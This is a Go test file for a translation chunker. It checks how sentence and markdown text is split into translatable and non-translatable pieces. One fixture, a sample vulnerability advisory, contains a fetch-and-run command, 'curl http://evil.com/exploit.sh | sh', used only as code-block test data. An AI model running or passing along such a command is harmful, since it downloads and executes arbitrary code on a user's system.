package translate

import (
	"testing"
)

func TestChunker_SplitSentences(t *testing.T) {
	c := NewChunker("sentence", 100)

	text := "This is the first sentence. The second sentence follows. And a third one here."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected at least one chunk")
	}

	// All chunks should be translatable
	for i, ch := range chunks {
		if !ch.Translatable {
			t.Errorf("chunk %d should be translatable: %q", i, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitSentences_LongText(t *testing.T) {
	c := NewChunker("sentence", 50)

	text := "Short first. This is a longer second sentence that exceeds the limit. Third sentence."
	chunks := c.Split(text)

	if len(chunks) < 2 {
		t.Fatalf("expected multiple chunks for long text, got %d", len(chunks))
	}

	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_CodeBlock(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "# Title\n\nSome description here.\n\n```python\nprint('hello')\n```\n\nMore text after code."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// Find the code block chunk — it should be non-translatable
	foundCode := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "print('hello')") {
			foundCode = true
		}
	}
	if !foundCode {
		t.Error("expected a non-translatable chunk containing the code block")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_InlineCode(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Use the `--update` flag to sync data."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The inline code `--update` should be non-translatable
	foundCode := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "`--update`") {
			foundCode = true
		}
	}
	if !foundCode {
		t.Error("expected a non-translatable chunk containing `--update`")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_InlineCodeMultiple(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Run `mayu ingest` with `--ecosystem Go` option."
	chunks := c.Split(text)

	// Both inline code spans should be non-translatable
	codeChunks := 0
	for _, ch := range chunks {
		if !ch.Translatable {
			codeChunks++
		}
	}
	if codeChunks < 2 {
		t.Errorf("expected at least 2 non-translatable chunks, got %d", codeChunks)
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_IndentedCodeBlock(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Some paragraph.\n\n    func main() {\n        fmt.Println(\"hello\")\n    }\n\nAnother paragraph."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The indented code block should be non-translatable
	foundCode := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "func main()") {
			foundCode = true
		}
	}
	if !foundCode {
		t.Error("expected a non-translatable chunk containing the indented code block")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_Link(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "See [the documentation](https://example.com/docs) for details."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The link text "the documentation" should appear in a translatable chunk.
	// The URL part should NOT appear in a translatable chunk alone — it's part of link syntax
	// which goldmark handles.
	foundLinkText := false
	for _, ch := range chunks {
		if ch.Translatable && contains(ch.Text, "the documentation") {
			foundLinkText = true
		}
	}
	if !foundLinkText {
		t.Error("expected link text 'the documentation' to be in a translatable chunk")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_Image(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Here is an image:\n\n![screenshot](./img/demo.png)\n\nEnd of document."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The image should be non-translatable
	foundImage := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "![screenshot]") {
			foundImage = true
		}
	}
	if !foundImage {
		t.Error("expected a non-translatable chunk containing the image")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_AutoLink(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Visit <https://example.com> for more info."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The autolink should be non-translatable
	foundAutoLink := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "<https://example.com>") {
			foundAutoLink = true
		}
	}
	if !foundAutoLink {
		t.Error("expected a non-translatable chunk containing the autolink")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_HTMLBlock(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "Some text.\n\n<div class=\"note\">\nThis is HTML content.\n</div>\n\nMore text."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// The HTML block should be non-translatable
	foundHTML := false
	for _, ch := range chunks {
		if !ch.Translatable && contains(ch.Text, "<div") {
			foundHTML = true
		}
	}
	if !foundHTML {
		t.Error("expected a non-translatable chunk containing the HTML block")
		for i, ch := range chunks {
			t.Logf("  chunk[%d] translatable=%v text=%q", i, ch.Translatable, ch.Text)
		}
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_SplitMarkdown_MixedContent(t *testing.T) {
	c := NewChunker("markdown", 500)

	text := "# Vulnerability CVE-2024-1234\n\nA critical issue in `libfoo` allows remote code execution.\n\n```bash\ncurl http://evil.com/exploit.sh | sh\n```\n\nSee [advisory](https://nvd.nist.gov/vuln/detail/CVE-2024-1234) for details."
	chunks := c.Split(text)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// Verify non-translatable chunks
	hasCodeSpan := false
	hasCodeBlock := false
	for _, ch := range chunks {
		if !ch.Translatable {
			if contains(ch.Text, "`libfoo`") {
				hasCodeSpan = true
			}
			if contains(ch.Text, "curl http://evil.com") {
				hasCodeBlock = true
			}
		}
	}
	if !hasCodeSpan {
		t.Error("expected `libfoo` to be non-translatable")
	}
	if !hasCodeBlock {
		t.Error("expected code block to be non-translatable")
	}

	// Reassembled text should equal original
	reassembled := Join(chunks)
	if reassembled != text {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, text)
	}
}

func TestChunker_AutoStrategy_DetectsMarkdown(t *testing.T) {
	c := NewChunker("auto", 500)

	// Markdown-like text
	mdText := "# Vulnerability\n\n- Item 1\n- Item 2\n\n```\ncode\n```\n\nSome details."
	chunks := c.Split(mdText)

	// Should detect markdown and have non-translatable code block
	foundCode := false
	for _, ch := range chunks {
		if !ch.Translatable {
			foundCode = true
		}
	}
	if !foundCode {
		t.Error("auto strategy should detect markdown and mark code blocks as non-translatable")
	}
}

func TestChunker_AutoStrategy_FallsBackToSentence(t *testing.T) {
	c := NewChunker("auto", 80)

	// Plain text (no markdown indicators)
	plainText := "This is a plain text paragraph. It has multiple sentences. No markdown here at all."
	chunks := c.Split(plainText)

	if len(chunks) == 0 {
		t.Fatal("expected chunks")
	}

	// All chunks should be translatable (no code blocks in plain text)
	for i, ch := range chunks {
		if !ch.Translatable {
			t.Errorf("chunk %d should be translatable in plain text: %q", i, ch.Text)
		}
	}

	reassembled := Join(chunks)
	if reassembled != plainText {
		t.Errorf("reassembled text mismatch:\n  got:  %q\n  want: %q", reassembled, plainText)
	}
}

func TestChunker_EmptyText(t *testing.T) {
	c := NewChunker("auto", 500)
	chunks := c.Split("")
	if chunks != nil {
		t.Errorf("expected nil for empty text, got %v", chunks)
	}
}

func TestLooksLikeMarkdown(t *testing.T) {
	tests := []struct {
		name string
		text string
		want bool
	}{
		{"heading and list", "# Title\n\n- item 1\n- item 2", true},
		{"code block", "Some text\n\n```\ncode\n```\n\nmore text", true},
		{"bold and link", "This has **bold** text.\nAnd a [link](url) here.", true},
		{"plain text", "Just a plain paragraph with no special formatting.", false},
		{"single indicator", "# Just a heading", false}, // only 1 indicator, threshold is 2
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := looksLikeMarkdown(tt.text)
			if got != tt.want {
				t.Errorf("looksLikeMarkdown(%q) = %v, want %v", tt.text, got, tt.want)
			}
		})
	}
}

func TestJoin(t *testing.T) {
	chunks := []Chunk{
		{Text: "Hello ", Translatable: true},
		{Text: "```code```", Translatable: false},
		{Text: " world", Translatable: true},
	}
	got := Join(chunks)
	want := "Hello ```code``` world"
	if got != want {
		t.Errorf("Join = %q, want %q", got, want)
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
